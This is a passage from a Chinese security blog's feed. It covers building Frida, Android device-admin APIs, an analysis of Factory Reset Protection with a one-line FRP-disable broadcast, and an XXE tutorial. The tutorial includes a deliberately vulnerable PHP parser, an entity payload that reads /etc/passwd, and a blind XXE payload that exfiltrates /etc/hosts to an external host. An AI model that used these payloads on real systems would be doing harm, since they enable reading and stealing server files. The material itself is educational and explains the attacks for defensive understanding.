href="https://bbs.pediy.com/thread-229215.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-229215.htm</a></li><li><a href="https://www.slideshare.net/ssusercf6665/frida-107244825" target="_blank" rel="noopener">基于Frida的全平台逆向分析</a></li><li><a href="https://blog.csdn.net/zhangmiaoping23/article/details/52572447" target="_blank" rel="noopener">Xposed框架原理深入研究</a></li><li><a href="https://blog.csdn.net/sinat_38172893/article/details/74612596" target="_blank" rel="noopener">art_quick_generic_jni_trampoline分析</a></li><li>[ART Method Execution]（<a href="https://blog.csdn.net/hl09083253cy/article/details/78418702）" target="_blank" rel="noopener">https://blog.csdn.net/hl09083253cy/article/details/78418702）</a></li><li>[ART执行类方法解析流程]（<a href="https://blog.csdn.net/zhu929033262/article/details/75093012）" target="_blank" rel="noopener">https://blog.csdn.net/zhu929033262/article/details/75093012）</a></li><li><a href="https://github.com/TinyNiko/TinyNiko.github.io/blob/master/Frida.pdf" target="_blank" rel="noopener">https://github.com/TinyNiko/TinyNiko.github.io/blob/master/Frida.pdf</a></li><li>Creating a Java VM from Android Native Code <a href="https://calebfenton.github.io/2017/04/05/creating_java_vm_from_android_native_code/" target="_blank" rel="noopener">https://calebfenton.github.io/2017/04/05/creating_java_vm_from_android_native_code/</a></li></ol><h2 id="mac下编译frida"><a href="#mac下编译frida" class="headerlink" title="mac下编译frida"></a>mac下编译frida</h2><ol><li>git clone <a href="https://github.com/frida/frida" target="_blank" rel="noopener">https://github.com/frida/frida</a></li><li>创建代码签名证书frida-cert<br>参考<a href="https://sourceware.org/gdb/wiki/BuildingOnDarwin中的2.1.1" target="_blank" rel="noopener">https://sourceware.org/gdb/wiki/BuildingOnDarwin中的2.1.1</a>. Create a certificate部分，将gdb-cert替换为frida-cert即可</li><li>make</li></ol><p>采坑记录：</p><ol><li>ANDROID_NDK_ROOT must be set to the location of your r15c NDK.<br>解决办法:<br>设置环境变量ANDROID_NDK_ROOT为ndk_r15c，必须为r15版本，我只是在当前shell里export ANDROID_NDK_ROOT=/home/xxx/ndk-path时无法编译通过，设为系统环境变量时，编译才通过。</li><li>Dependency ‘glib-2.0’ not found<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meson.build:123:0: ERROR:  Dependency &apos;glib-2.0&apos; not found, tried Extra Frameworks and Pkg-Config:</span><br><span class="line">&apos;utf-8&apos; codec can&apos;t decode byte 0xe5 in position 16: invalid continuation byte</span><br></pre></td></tr></table></figure></li></ol><p>实际运行pkg-config –modversion glib-2.0时，发现glib-2.0是存在的，出现以上错误是因为路径中包含中文！！！</p><ol><li>AttributeError: module ‘enum’ has no attribute ‘IntFlag’<br>解决办法: 设置PYTHONPATH为python3.6的路径,export PYTHONPATH=/usr/bin/python3.6</li></ol>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>Android设备管理器</title>
      <link href="/2018/07/26/Android%E8%AE%BE%E5%A4%87%E7%AE%A1%E7%90%86%E5%99%A8/"/>
      <url>/2018/07/26/Android%E8%AE%BE%E5%A4%87%E7%AE%A1%E7%90%86%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>Android 提供了一个可管理和操作设备的API叫DevicePolicyManager，使用这个API可以接管手机的应用权限，对手机做出很重要很多大胆的操作,比如<strong>设置锁屏方式、恢复出厂设置、设置密码、强制清除密码，修改密码</strong>等操作。</p><p>很多“远程查找手机”的实现使用了设备管理器功能，可以实现远程锁定手机，远程擦除，远程响铃等。</p><p>此外，很多恶意软件通过设备管理器进行“锁屏勒索”等恶意操作，为了限制设备管理器被滥用，Android N 规定，第三方应用开发者只能使用DevicePolicyManager.resetPassword为无密码设备设置初始密码，而不能重置或清除已有的设备密码，但在Android N以下还是存在该类型的勒索攻击。</p><p>由于设备管理器的高权限，因此要谨慎对待申请激活设备管理器的App，例如：<br>今日头条、某些安全管家等等，</p><h2 id="二、设备管理器使用"><a href="#二、设备管理器使用" class="headerlink" title="二、设备管理器使用"></a>二、设备管理器使用</h2><ol><li>Menifest文件中注册receiver</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;receiver  android:name=&quot;.demo.DeviceReceiver&quot;</span><br><span class="line">            android:permission=&quot;android.permission.BIND_DEVICE_ADMIN&quot;&gt;</span><br><span class="line">            &lt;meta-data</span><br><span class="line">                android:name=&quot;android.app.device_admin&quot;</span><br><span class="line">                android:resource=&quot;@xml/device_admin&quot; /&gt;</span><br><span class="line"></span><br><span class="line">            &lt;intent-filter&gt;</span><br><span class="line">                &lt;action android:name=&quot;android.app.action.DEVICE_ADMIN_ENABLED&quot; /&gt;</span><br><span class="line">                &lt;action android:name=&quot;android.intent.action.BOOT_COMPLETED&quot; /&gt;</span><br><span class="line">                &lt;category android:name=&quot;android.intent.category.HOME&quot; /&gt;</span><br><span class="line">            &lt;/intent-filter&gt;</span><br><span class="line">        &lt;/receiver&gt;</span><br></pre></td></tr></table></figure><ol><li>创建xml文件夹添加device_admin.xml</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;device-admin</span><br><span class="line">    xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;&gt;</span><br><span class="line">    &lt;uses-policies&gt;</span><br><span class="line">        &lt;limit-password /&gt;</span><br><span class="line">        &lt;!-- 限制密码类型 --&gt;</span><br><span class="line">        &lt;watch-login /&gt;</span><br><span class="line">        &lt;!-- 监控登录尝试 --&gt;</span><br><span class="line">        &lt;reset-password /&gt;</span><br><span class="line">        &lt;!-- 重置密码 --&gt;</span><br><span class="line">        &lt;force-lock /&gt;</span><br><span class="line">        &lt;!--锁屏 --&gt;</span><br><span class="line">        &lt;wipe-data /&gt;</span><br><span class="line">        &lt;!-- 恢复出厂设置 --&gt;</span><br><span class="line">    &lt;/uses-policies&gt;</span><br><span class="line">&lt;/device-admin&gt;</span><br></pre></td></tr></table></figure><ol><li><p>新建一个class继承DeviceAdminReceiver</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import android.app.admin.DeviceAdminReceiver;</span><br><span class="line">public class MyAdmin extends DeviceAdminReceiver &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>实现代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">public class MainActivity extends AppCompatActivity &#123;</span><br><span class="line">    private DevicePolicyManager dpm;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    protected void onCreate(Bundle savedInstanceState) &#123;</span><br><span class="line">        super.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);</span><br><span class="line"></span><br><span class="line">        //openAdmin();</span><br><span class="line">        Button bt = (Button)findViewById(R.id.button);</span><br><span class="line">        bt.setOnClickListener(new View.OnClickListener() &#123;</span><br><span class="line">            @Override</span><br><span class="line">            public void onClick(View view) &#123;</span><br><span class="line">                ComponentName cn = new ComponentName(getApplication(), MyAdmin.class);</span><br><span class="line">                if(dpm.isAdminActive(cn))&#123;</span><br><span class="line">                    //设备管理员的api</span><br><span class="line">                    dpm.lockNow();  //锁屏</span><br><span class="line">        //dpm.wipeData(0);  //擦除数据,谨慎使用</span><br><span class="line">                    //dpm.wipeData(DevicePolicyManager.WIPE_EXTERNAL_STORAGE);//删除sdcard数据</span><br><span class="line">                    &#125;else&#123;</span><br><span class="line">        openAdmin();</span><br><span class="line">                    Toast.makeText(getApplicationContext(), &quot;请先激活管理员&quot;, 0).show();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    //激活设备管理器</span><br><span class="line">    public void openAdmin()&#123;</span><br><span class="line">        //进入设备管理器激活向导</span><br><span class="line">        Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);</span><br><span class="line">        ComponentName cn = new ComponentName(this, MyAdmin.class);</span><br><span class="line">        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, cn);</span><br><span class="line">        //提示用户开启管理员</span><br><span class="line">        intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,</span><br><span class="line">                &quot;请激活设备管理器&quot;);</span><br><span class="line">        startActivityForResult(intent,0);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="三、设备管理器相关漏洞"><a href="#三、设备管理器相关漏洞" class="headerlink" title="三、设备管理器相关漏洞"></a>三、设备管理器相关漏洞</h2><ol><li>隐藏设备管理器中的列表<br>当用户激活设备管理器后，程序会在setting设备管理器列表隐藏，应用程序激活成设备管理器后，可以实现锁屏、擦除用户数据等功能，并且无法使用常规的卸载方式对其卸载<br>参考：<a href="https://bbs.pediy.com/thread-183692.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-183692.htm</a><br><a href="http://seclab.safe.baidu.com/2014-10/deviceadminexploit2.html" target="_blank" rel="noopener">http://seclab.safe.baidu.com/2014-10/deviceadminexploit2.html</a></li></ol>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>Android FRP功能分析（Factory Reset Protection）</title>
      <link href="/2018/07/25/Android-FRP%E5%8A%9F%E8%83%BD%E5%88%86%E6%9E%90%EF%BC%88Factory-Reset-Protection%EF%BC%89/"/>
      <url>/2018/07/25/Android-FRP%E5%8A%9F%E8%83%BD%E5%88%86%E6%9E%90%EF%BC%88Factory-Reset-Protection%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>最近在对华为P10刷机时，发现解锁bootloader需要关闭“查找我的手机“功能，此外，解锁bootloader后刷recovery时，仍然需要关闭“查找我的手机”才能进行，这种现象表明了Android主系统可以操作bootloader和recovery分区，一番查找后，发现这个功能叫做<strong>FRP（Factory Reset Protection）</strong>,自Android 5.0后引入，为了防止手机被盗后被刷机而引入的一种保护机制。</p><h2 id="FRP工作机制"><a href="#FRP工作机制" class="headerlink" title="FRP工作机制"></a>FRP工作机制</h2><p>我们假设手机被盗取后的几个场景来分析：</p><h3 id="一、手机有锁屏密码，盗取者无法进入主系统"><a href="#一、手机有锁屏密码，盗取者无法进入主系统" class="headerlink" title="一、手机有锁屏密码，盗取者无法进入主系统"></a>一、手机有锁屏密码，盗取者无法进入主系统</h3><p>方案1：<br>盗取者为了使用该设备，此时，很容易想到进入recovery模式去恢复出厂设置，即使这样，原机主的设备在reset后数据被清除，但重启后再次进入系统前，FRP保护开始工作，要求输入原设备绑定的账号解锁。如下是在华为手机上做的实验：</p><p><img src="/images/pasted-75.png" alt="upload successful"></p><p>方案2：<br>既然原设备的recovery有检查，那盗取者可以刷第三方的recovery,此时便需要解锁bootloader。然而，随着很多手机厂商都不提供解锁bootloader服务，仅仅是解锁bootloader就很困难了，我们再假设盗取者有解锁bootloader的能力，然而FRP又发挥了作用，在bootloader中设置了一个标记位，只有这个标记位置零时才允许解锁bootloader。同样道理，即使完成了解锁bootloader这一关，刷第三方recovery时依然受到FRP保护。</p><p>两种方案都失败了，对于盗取者来说，只能眼睁睁看着设备卖废铁了，所以FRP作用还是挺大的。</p><h3 id="二、无锁屏密码或被破解，盗取者可以进入主系统"><a href="#二、无锁屏密码或被破解，盗取者可以进入主系统" class="headerlink" title="二、无锁屏密码或被破解，盗取者可以进入主系统"></a>二、无锁屏密码或被破解，盗取者可以进入主系统</h3><p>这个时候就比较尴尬了，失主的数据当然一览无余，但盗取者可能有三种操作：</p><ol><li>关闭FRP保护</li><li>添加一个自己的账户或删除原机主账户</li><li>在设置中恢复出厂设置<br>这三种操作无论哪一个，都需要输入原账户的口令进行验证。</li></ol><p>当然，如果知道原账户的账号，我可以重置密码，毕竟能进主系统就可以收验证码。但google的账户要求在重置72小时后才能关闭FRP，这期间失主可以对手机进行远程擦除或锁定。国内的其他厂商应该也有一些保护机制，但不代表可以万无一失，不过由此看来设置锁屏密码还是非常重要的。</p><p>根据上述两个场景，总结FRP的功能如下：</p><ul><li>只要有google账户（第三方厂商也可以），有网络，就可以远程通过Android Device Manager(ADM)锁屏</li><li>frp打开后，如下操作会提示密码：在主用户上添加google账户；删除最后一个google账户</li><li>frp打开后，只有在Settings下做factory reset才会清除reset token，重新打开setup wizard（设置向导）时才不需要密码 (trusted factory reset)</li><li>frp打开后，bootloader下或者ADM下做factory reset不会清除reset token，重新打开setup wizard时会提示输入密码。 (untrusted factory reset), 只要输入的账户/密码符合之前任意一个google账户即可。</li></ul><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>Android中FRP实现主要在以下几个文件中：</p><ul><li>IPersistentDataBlockService.aidl<br><a href="https://android.googlesource.com/platform/frameworks/base/+/master/core/java/android/service/persistentdata/IPersistentDataBlockService.aidl" target="_blank" rel="noopener">https://android.googlesource.com/platform/frameworks/base/+/master/core/java/android/service/persistentdata/IPersistentDataBlockService.aidl</a></li><li><p>PersistentDataBlockManager.java<br><a href="https://android.googlesource.com/platform/frameworks/base/+/1c4d535d0806dbeb6d2fa5cea0373cbd9ab6d33b/core/java/android/service/persistentdata/PersistentDataBlockManager.java" target="_blank" rel="noopener">https://android.googlesource.com/platform/frameworks/base/+/1c4d535d0806dbeb6d2fa5cea0373cbd9ab6d33b/core/java/android/service/persistentdata/PersistentDataBlockManager.java</a></p></li><li><p>PersistentDataBlockService.java<br><a href="https://android.googlesource.com/platform/frameworks/base.git/+/master/services/core/java/com/android/server/PersistentDataBlockService.java" target="_blank" rel="noopener">https://android.googlesource.com/platform/frameworks/base.git/+/master/services/core/java/com/android/server/PersistentDataBlockService.java</a></p></li><li><p>com_android_server_PersistentDataBlockService.cpp<br><a href="https://android.googlesource.com/platform/frameworks/base/+/master/services/core/jni/com_android_server_PersistentDataBlockService.cpp" target="_blank" rel="noopener">https://android.googlesource.com/platform/frameworks/base/+/master/services/core/jni/com_android_server_PersistentDataBlockService.cpp</a></p></li></ul><p>当创建有一个账户时，FRP会创建一个重置的标志位和key保存在这个block里面，可以用通过其他的android设备登陆你的google账户定位或者锁定，远程清空手机，回复出场设置等。</p><p>FRP在bootloader分区的最后一个字节用于信号标记，如果字节为0，OEM-UNLOCK位DISABLE。即，当此字节设置为0，fastboot oem unlock应该失败。enable/disbale OEM-UNLOCK只能通过PersistentDataBlockManager这个API来更改（相当于更改分区最后1个byte）。</p><p>FRP对应一个Account Data Blocks用来存放key，其实就是一个独立的存储分区（500kb - 2M），通过系统中的ro.frp.pst来指定该分区的路径：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ro.frp.pst=/dev/block/platform/sdhci-tegra.3/by-name/PST</span><br><span class="line">ro.frp.pst=/dev/block/platform/msm_sdcc.1/by-name/frp</span><br></pre></td></tr></table></figure></p><p>对其的读写操作是通过API——android.service.persistentdata.PersistentDataBlockManager来操作的，当然操作需要特殊的权限，具体在代码中有解释。</p><p>这部分代码的核心其实就是读写操作，例如PersistentDataBlockService#wipe(),实际上就是ioctl(fd, BLKSECDISCARD, &amp;range)。</p><h2 id="FRP漏洞"><a href="#FRP漏洞" class="headerlink" title="FRP漏洞"></a>FRP漏洞</h2><ol><li>Nexus 6 重置后利用设置向导的漏洞进入系统<br><a href="https://www.androidauthority.com/factory-reset-protection-bypass-nexus-marshmallow-680580/" target="_blank" rel="noopener">https://www.androidauthority.com/factory-reset-protection-bypass-nexus-marshmallow-680580/</a></li><li>Huawei安全公告上一个FRP绕过（未公开）<br><a href="https://www.huawei.com/en/psirt/security-advisories/huawei-sa-20170524-01-frp-en" target="_blank" rel="noopener">https://www.huawei.com/en/psirt/security-advisories/huawei-sa-20170524-01-frp-en</a></li></ol><p>事实上，我在一部root的手机上am broadcast -a “com.huawei.remotecontrol.OFF_REMOTE”就可以关闭FRP，无需输入账号验证，因此这里可能存在什么问题，后续待研究。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol><li><a href="https://support.google.com/nexus/answer/6172890?hl=en" target="_blank" rel="noopener">Help prevent others from using your device without permission</a></li><li><a href="https://blog.csdn.net/woshing123456/article/details/44524051" target="_blank" rel="noopener">https://blog.csdn.net/woshing123456/article/details/44524051</a></li><li><a href="https://www.androidpolice.com/2015/03/12/guide-what-is-android-5-1s-antitheft-device-protection-feature-and-how-do-i-use-it/" target="_blank" rel="noopener">https://www.androidpolice.com/2015/03/12/guide-what-is-android-5-1s-antitheft-device-protection-feature-and-how-do-i-use-it/</a></li><li><a href="http://cfig.github.io/2017/12/20/Android-Factory-Reset-Protection-FRP/" target="_blank" rel="noopener">http://cfig.github.io/2017/12/20/Android-Factory-Reset-Protection-FRP/</a></li></ol>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>XXE漏洞攻击和防御</title>
      <link href="/2018/07/03/XXE%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E5%92%8C%E9%98%B2%E5%BE%A1/"/>
      <url>/2018/07/03/XXE%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E5%92%8C%E9%98%B2%E5%BE%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>近期微信支付SDK爆出了一个严重的XXE漏洞（<a href="http://seclists.org/fulldisclosure/2018/Jul/3），可导致商家服务器上的文件被窃取。" target="_blank" rel="noopener">http://seclists.org/fulldisclosure/2018/Jul/3），可导致商家服务器上的文件被窃取。</a></p><p>XXE (XML External Entity Injection) 漏洞发生在应用程序解析 XML 输入时，没有禁止外部实体的加载。在web上愈来愈少，但在一些大家不容易想到的地方还是存在很多，例如之前apktool工具爆出的XXE漏洞用来攻击APK分析人员。</p><h1 id="二、漏洞原理"><a href="#二、漏洞原理" class="headerlink" title="二、漏洞原理"></a>二、漏洞原理</h1><p>XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。</p><p><img src="/images/pasted-60.png" alt="upload successful"></p><h2 id="DTD（文档类型定义）"><a href="#DTD（文档类型定义）" class="headerlink" title="DTD（文档类型定义）"></a>DTD（文档类型定义）</h2><p>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。</p><ul><li><strong>内部声明DTD</strong></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br></pre></td></tr></table></figure><ul><li><strong>引用外部DTD</strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</span><br><span class="line">//或者</span><br><span class="line">&lt;!DOCTYPE 根元素 PUBLIC &quot;public_ID&quot; &quot;文件名&quot;&gt;</span><br></pre></td></tr></table></figure></li></ul><p>DTD文档中有很多重要的关键字如下：</p><pre><code>- DOCTYPE（DTD的声明）- ENTITY（实体的声明）- SYSTEM、PUBLIC（外部资源申请）</code></pre><h2 id="ENTITY（实体）"><a href="#ENTITY（实体）" class="headerlink" title="ENTITY（实体）"></a>ENTITY（实体）</h2><p>实体可以理解为变量，其必须在DTD中定义申明，可以在文档中的其他位置引用该变量的值。</p><p>根据引用方式，实体可分为内部实体、外部实体、参数实体。<br>完整的实体类别可参考 DTD - Entities（<a href="https://www.tutorialspoint.com/dtd/dtd_entities.htm）" target="_blank" rel="noopener">https://www.tutorialspoint.com/dtd/dtd_entities.htm）</a></p><ul><li><strong>内部实体</strong></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure><ul><li><strong>外部实体</strong></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure><ul><li><strong>参数实体</strong></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % 实体名称 &quot;实体的值&quot;&gt;</span><br><span class="line">或者</span><br><span class="line">&lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure><p>注意：<br>参数实体用%实体名称申明，引用时也用%实体名称;其余实体直接用实体名称申明，引用时用&amp;实体名称。</p><p>参数实体只能在DTD中申明，DTD中引用；其余实体只能在DTD中申明，可在xml文档中引用。</p><p>以下为一个xml实例：</p><ul><li>1.name为内部实体，引用时用的\&amp;name,在xml文档中引用</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">    &lt;!ENTITY name &quot;nMask&quot;&gt;]</span><br><span class="line">&gt;</span><br><span class="line">    </span><br><span class="line">&lt;foo&gt;</span><br><span class="line">        &lt;value&gt;&amp;name;&lt;/value&gt; </span><br><span class="line">&lt;/foo&gt;</span><br></pre></td></tr></table></figure><ul><li>2.name为参数实体，声明和引用都使用%，且都在DTD中</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">    &lt;!ENTITY % name SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">    %name;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p>由于xxe漏洞主要是利用了DTD引用外部实体导致的漏洞，那么重点看下能引用哪些类型的外部实体。</p><h2 id="外部实体引用"><a href="#外部实体引用" class="headerlink" title="外部实体引用"></a>外部实体引用</h2><p>在DTD中使用外部实体即<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure></p><p>URL主要有file、http、https、ftp等等，不同的程序支持URI的不一样：</p><p><img src="/images/pasted-61.png" alt="upload successful"></p><p>外部实体引用实例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">    &lt;!ENTITY content SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;</span><br><span class="line">&lt;foo&gt;</span><br><span class="line">        &lt;value&gt;&amp;content;&lt;/value&gt; </span><br><span class="line">&lt;/foo&gt;</span><br></pre></td></tr></table></figure></p><p>由于引用了外部实体，这里的URI可以是 http链接、file://本地文件引用等，因此可以加载http指向的资源和本地文件，导致出现了XML解析的安全问题。</p><h1 id="三、攻击"><a href="#三、攻击" class="headerlink" title="三、攻击"></a>三、攻击</h1><h3 id="XXE的攻击场景或条件"><a href="#XXE的攻击场景或条件" class="headerlink" title="XXE的攻击场景或条件"></a>XXE的攻击场景或条件</h3><ol><li>解析外部提供的XML数据</li><li>未禁用外部实体引用</li><li>解析完xml后返回（非必要）</li></ol><h3 id="XXE攻击演示"><a href="#XXE攻击演示" class="headerlink" title="XXE攻击演示"></a>XXE攻击演示</h3><p>服务端代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//允许加载外部实体</span><br><span class="line">libxml_disable_entity_loader(false);</span><br><span class="line"></span><br><span class="line">//获取xml数据</span><br><span class="line">$xmlfile = file_get_contents(&quot;php://input&quot;);</span><br><span class="line"></span><br><span class="line">//解析并回显</span><br><span class="line">$dom = new DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile,LIBXML_NOENT|LIBXML_DTDLOAD);</span><br><span class="line">$creds = simplexml_import_dom($dom);</span><br><span class="line">$user = $creds-&gt;user;</span><br><span class="line">$pass = $creds-&gt;pass;</span><br><span class="line">echo &quot;user is $user&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>攻击代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST http://192.168.1.28/xxetest.php</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;</span><br><span class="line">&lt;creds&gt;</span><br><span class="line">&lt;user&gt;&amp;xxe;&lt;/user&gt;</span><br><span class="line">&lt;pass&gt;mypass&lt;/pass&gt;</span><br><span class="line">&lt;/creds&gt;</span><br></pre></td></tr></table></figure></p><h3 id="bind-XXE-对于没有回显的情况利用参数实体"><a href="#bind-XXE-对于没有回显的情况利用参数实体" class="headerlink" title="bind XXE(对于没有回显的情况利用参数实体)"></a>bind XXE(对于没有回显的情况利用参数实体)</h3><p>攻击代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE convert [ </span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://192.168.1.17:80/file.dtd&quot;&gt;%remote;%int;%send;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;foo&gt;&lt;/foo&gt;</span><br></pre></td></tr></table></figure></p><p>外部 DTD 文件 <a href="http://192.168.1.17:80/file.dtd" target="_blank" rel="noopener">http://192.168.1.17:80/file.dtd</a> 内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///etc/hosts&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send system &apos;http://192.168.1.17:80/?p=%file;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure></p><p>因为实体的值中不能有 %, 